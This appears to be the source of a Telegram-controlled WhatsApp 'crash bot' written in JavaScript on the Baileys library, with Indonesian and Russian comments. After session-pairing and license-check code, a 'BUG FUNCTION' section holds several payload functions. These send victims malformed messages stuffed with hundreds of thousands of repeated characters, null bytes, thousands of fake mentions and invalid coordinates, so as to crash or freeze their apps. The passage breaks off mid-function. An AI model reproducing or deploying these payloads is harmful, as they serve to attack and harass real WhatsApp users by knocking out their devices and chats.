/// © D4nz / Shedow-
const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
} = require("@whiskeysockets/baileys");
const fs = require("fs-extra");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const BullCrash = "https://files.catbox.moe/mlo5v8.png";
let premiumUsers = JSON.parse(fs.readFileSync("./database/premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./database/admin.json"));
function sessionPath(number) {
  return path.join(SESSIONS_DIR, `device${number}`);
}
function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}
ensureFileExists("./database/premium.json");
ensureFileExists("./database/admin.json");
// Fungsi untuk menyimpan data premium dan admin
function savePremiumUsers() {
  fs.writeFileSync(
    "./database/premium.json",
    JSON.stringify(premiumUsers, null, 2)
  );
}

function saveAdminUsers() {
  fs.writeFileSync(
    "./database/admin.json",
    JSON.stringify(adminUsers, null, 2)
  );
}  
// ========================= [ UTILITY FUNCTIONS ] =========================

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`Error updating ${filePath}:`, error.message);
      }
    }
  });
}
watchFile("./database/premium.json", (data) => (premiumUsers = data));
watchFile("./database/admin.json", (data) => (adminUsers = data));
const axios = require("axios");
const chalk = require("chalk"); // Import chalk untuk warna
const config = require("./settings/config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const OWNER_1 = config.OWNER_1;
const OWNER_2 = config.OWNER_2;
const GITHUB_TOKEN_LIST_URL = 
  "https://raw.githubusercontent.com/D4nzyXcripter/Get-Script/refs/heads/main/GetScript.json"; // Ganti dengan URL GitHub yang benar
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens; // Asumsikan format JSON: { "tokens": ["TOKEN1", "TOKEN2", ...] }
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}
async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));
  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token tidak valid! Bot tidak dapat dijalankan."));
    process.exit(1);
  }
  console.log(chalk.green(` #- Token Valid⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
}
const bot = new TelegramBot(BOT_TOKEN, {
  polling: true,
});

function startBot() {
  console.log(
    chalk.red(`
⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

`)
  );
  console.log(
    chalk.red(`
Информация 🤭
🇧🇷🇧🇷🇧🇷🇧🇷🇧🇷🇧🇷
Дев : t.me/elkalah123
Канал : t.me/shedow_Reals
`)
  );
  console.clear(
    chalk.blue(`
[ 🚀 Di langit masih ada tuhan ]...
`)
  );
}
validateToken();
let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}
async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);
      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({
            level: "silent",
          }),
          defaultQueryTimeoutMs: undefined,
        });
        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });
          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, {
      recursive: true,
    });
  }
  return deviceDir;
}

function extractGroupID(link) {
  try {
    if (link.includes("chat.whatsapp.com/")) {
      return link.split("chat.whatsapp.com/")[1];
    }
    return null;
  } catch {
    return null;
  }
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `<blockquote>𝙵   𝙻   𝚄   𝚇   𝚄   𝚂 🍂</blockquote>
<blockquote>Статус кода сопряжения здесь
╰➤ Number  : ${botNumber} 
╰➤ Status : Loading...</blockquote>
`,
      {
        parse_mode: "HTML",
      }
    )
    .then((msg) => msg.message_id);
  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({
      level: "silent",
    }),
    defaultQueryTimeoutMs: undefined,
  });
  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `<blockquote>𝙵   𝙻   𝚄   𝚇   𝚄   𝚂 🍂</blockquote>
<blockquote>Статус кода сопряжения здесь
╰➤ Number  : ${botNumber} 
╰➤ Status : Mennghubungkan</blockquote>
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `<blockquote>𝙵   𝙻   𝚄   𝚇   𝚄   𝚂 🍂</blockquote>
<blockquote>Статус кода сопряжения здесь
╰➤ Number  : ${botNumber} 
╰➤ Status : Gagal Tersambung</blockquote>
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, {
            recursive: true,
            force: true,
          });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `<blockquote>𝙵   𝙻   𝚄   𝚇   𝚄   𝚂 🍂</blockquote>
<blockquote>Статус кода сопряжения здесь
╰➤ Number  : ${botNumber} 
╰➤ Status : Pairing
╰➤Pesan : Succes Pairing</blockquote>
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `<blockquote>𝙵   𝙻   𝚄   𝚇   𝚄   𝚂 🍂</blockquote>
<blockquote>Статус кода сопряжения здесь
╰➤ Number  : ${botNumber} 
╰➤ Status : Pairing
╰➤ Kode : ${formattedCode}
</blockquote>`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "HTML",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `<blockquote>𝙵   𝙻   𝚄   𝚇   𝚄   𝚂 🍂</blockquote>
<blockquote>Статус кода сопряжения здесь
╰➤ Number  : ${botNumber} 
╰➤ Status : Erorr❌
╰➤ Pesan : ${error.message}
</blockquote>`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });
  sock.ev.on("creds.update", saveCreds);
  return sock;
}
//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}
const startTime = Math.floor(Date.now() / 1000); // Simpan waktu mulai bot
function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}
//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); // Panggil fungsi yang sudah dibuat
}
//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}
// Get Random Image
function getRandomImage() {
  const images = ["https://files.catbox.moe/mlo5v8.png"];
  return images[Math.floor(Math.random() * images.length)];
}
// ~ Coldown
const cooldowns = new Map();
const cooldownTime = 5 * 60 * 1000; // 5 menit dalam milidetik
function checkCooldown(userId) {
  if (cooldowns.has(userId)) {
    const remainingTime = cooldownTime - (Date.now() - cooldowns.get(userId));
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000); // Sisa waktu dalam detik
    }
  }
  cooldowns.set(userId, Date.now());
  setTimeout(() => cooldowns.delete(userId), cooldownTime);
  return 0; // Tidak dalam cooldown
}
// [ BUG FUNCTION ]
async function buggccrash(groupId) {
  let message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: ["13135550002@s.whatsapp.net"],
            quotedMessage: {
              documentMessage: {
                contactVcard: true,
              },
            },
          },
          body: {
            text: "⭑̤⟅ ༑ ▾⭑̤▾ ⿻ Foryoǔ ⿻ ▾ ༑̴⟆ ‏⭑̤",
          },
          nativeFlowMessage: {
            messageParamsJson: "",
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  status: true,
                }),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({
                  status: true,
                }),
              },
            ],
          },
        },
      },
    },
  };

  await sock.relayMessage(groupId, message, {});
  console.log(chalk.green("Send Bug By ⭑̤▾Foryou▾⭑"));
}

async function Overgroup(sock, groupId) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
            })
          },
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false,
              liveLocationMessage: {
               degreesLatitude: -999.035,
               degreesLongitude: 922.999999999999,
                name: "",
                address: "1.1.1.1.1.1",
              },
            },
            body: {
              text: "",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(100000),
            },
            contextInfo: {
              participant: groupId,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 35000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 500000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(groupId, message, {
      messageId: null,
      participant: { jid: groupId },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}

  async function NewsletterZapTeks(sock, groupId) {
  const isGroup = groupId.endsWith("@g.us");

  const newsletterMessage = generateWAMessageFromContent(groupId, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: `120363298524333143@newsletter`,
          newsletterName: "🚫⃰͜͡⭑𝐓𝐝͢𝐗⭑͜͡🚫⃰" + "\u0000".repeat(920000),
          jpegThumbnail: "",
          caption: `⭑̤⟅ ༑ ▾⭑̤▾ ⿻ Foryoǔ ⿻ ▾ ༑̴⟆ ‏⭑`,
          inviteExpiration: Date.now() + 1814400000
        }
      }
    }
  }), {
    userJid: groupId
  });

  await sock.relayMessage(groupId, newsletterMessage.message, isGroup ? {
    messageId: newsletterMessage.key.id
  } : {
    messageId: newsletterMessage.key.id,
    participant: { jid: groupId }
  });

  await new Promise(resolve => setTimeout(resolve, 500)); // delay

  const textMessage = generateWAMessageFromContent(groupId, proto.Message.fromObject({
    conversation: "⭑̤⟅ ༑ ▾⭑̤▾ ⿻ Foryoǔ ⿻ ▾ ༑̴⟆ ‏⭑"
  }), {
    userJid: groupId
  });

  await sock.relayMessage(groupId, textMessage.message, isGroup ? {
    messageId: textMessage.key.id
  } : {
    messageId: textMessage.key.id,
    participant: { jid: groupId }
  });
}

async function NewsletterZap(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363324407259541@newsletter`,
							"newsletterName": "𝐑𝐮𝐳𝐱𝐱𝐃𝐞𝐯 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 <> 𝐒𝐡𝐚𝐫𝐞 𝐀𝐛𝐨𝐮𝐭 𝐁𝐨𝐭 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩." + "\u0000".repeat(920000),
							"jpegThumbnail": bug,
							"caption": `Undangan Admin Channel 𝐑𝐮𝐳𝐱𝐱𝐃𝐞𝐯 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 <> 𝐒𝐡𝐚𝐫𝐞 𝐀𝐛𝐨𝐮𝐭 𝐁𝐨𝐭 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩.`,
							"inviteExpiration": Date.now() + 1814400000
						}
					}
				}
			}), {
				'userJid': LockJids
			});
			await sock.relayMessage(LockJids, messageContent.message, {
				'participant': {
					'jid': LockJids
				},
				'messageId': messageContent.key.id
			});
		}

        const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(60000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }

async function korbanFuncKefix(sock, jid, mention) {
  const floods = 2000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    "6287893344461@s.whatsapp.net", 
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 32000)}@s.whatsapp.net`
    )
  ];
  
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19890,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              "6285787255381@s.whatsapp.net", 
              "status@broadcast", 
              ...Array.from(
                {
                  length: 1900,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg1 = generateWAMessageFromContent(jid, message, {});

  await sock.relayMessage("status@broadcast", msg1.message, {
    messageId: msg1.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: jid },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  const zap = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "⎋ 🦠</🧬⃟༑⌁⃰𝙀𝙇 𝙔𝘼𝙋𝙋𝙄𝙉𝙂 𝙁𝙐𝙉𝘾 𝙆𝙀 𝙁𝙄𝙓" + "ោ៝".repeat(50000),
    title: "☆",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };

  const tmsg = await generateWAMessageFromContent(jid, {
    requestPhoneNumberMessage: {
      contextInfo: {
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        stanzaId: "ZrMId" + Math.floor(Math.random() * 99999999999),
        forwardingScore: 100,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780349272@newsletter",
          serverMessageId: 1,
          newsletterName: "ោ៝".repeat(50000)
        },
        mentionedJid: [
          "13135550002@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 60000000)}@s.whatsapp.net`
          )
        ],
        annotations: [
          {
            embeddedContent: {
              zap
            },
            embeddedAction: true
          }
        ]
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", tmsg.message, {
    messageId: tmsg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: { is_status_mention: "false" },
            content: [
              {
                tag: "to",
                attrs: { jid: jid },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
  
    if (mention) {
        await sock.relayMessage(jid, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: tmsg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function locationUi(sock, jid) {
    const generateLocationMessage = {
        viewOnceMessage: {
            message: {
                locationMessage: {
                    degreesLatitude: 10.0000,
                    degreesLongitude: 114.0000,
                    name: "𝙃𝙞𝙙𝙪𝙥 𝙟𝙤𝙬𝙠𝙤𝙬𝙬𝙞" + "ꦽ".repeat(25000),
                    address: "\u0000".repeat(1990),
                    text: "𝙏𝙍𝘼𝙑𝘼𝙎𝘿𝙀𝙓" + "ោ៝".repeat(30000),
                    contextInfo: {
                    externalAdReply: {
isCanceled: false,
name: "penis terbang",
description: "penis",
location: {
degreesLatitude: 0,
degreesLongitude: 0,
name: "rowrrrr"
},
joinLink: "https://call.whatsapp.com/video/kyuurzy",
startTime: "1763019000",
endTime: "1763026200",
extraGuestsAllowed: false

},
                        mentionedJid: Array.from({ length: 1900 }, () =>
                            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"), 
                        isSampled: true,
                        participant: jid,
                        text: "𝙏𝙍𝘼𝙑𝘼𝙎𝘿𝙀𝙓" + "ោ៝".repeat(30000),
                        remoteJid: jid,
                        forwardingScore: 999,
                        isForwarded: true, 
                        forwardedNewsletterMessageInfo: {
                        newsletterJid: "120363321780343299@newsletter",
                        serverMessageId: 1,
                        newsletterName: "Travasdex ✦ Voldigoad" + "ោ៝".repeat(30000),
    }                    
                 }
            }
         }
       }
    };
    
const Msg = {
    call: {
      callType: 1,
      callId: String(Date.now()),
      callStartTimestamp: Date.now(),
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        mentionedJid: [
          ...Array.from({ length: 1700 }, () =>
            "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
          )
        ]
      }
    }
  };
  
    const locationMsg = generateWAMessageFromContent(jid, generateLocationMessage, Msg, {});

    await sock.relayMessage(jid, locationMsg.message, {
        messageId: locationMsg.key.id
    });
}

async function korbanFuncKefix2(sock, jid, mention) {
  const floods = 2000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    "6287893344461@s.whatsapp.net", 
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 32000)}@s.whatsapp.net`
    )
  ];
  
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19890,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              "6285787255381@s.whatsapp.net", 
              "status@broadcast", 
              ...Array.from(
                {
                  length: 1900,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg1 = generateWAMessageFromContent(jid, message, {});

  await sock.relayMessage("status@broadcast", msg1.message, {
    messageId: msg1.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: jid },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  const zap = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "</🧬⃟༑⌁⃰𝙁𝙐𝙉𝘾 𝙆𝙀 𝙁𝙄𝙓" + "ោ៝".repeat(50000),
    title: "☆",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };

  const tmsg = await generateWAMessageFromContent(jid, {
    requestPhoneNumberMessage: {
      contextInfo: {
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        stanzaId: "ZrMId" + Math.floor(Math.random() * 99999999999),
        forwardingScore: 100,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780349272@newsletter",
          serverMessageId: 1,
          newsletterName: "ោ៝".repeat(50000)
        },
        mentionedJid: [
          "13135550002@s.whatsapp.net",
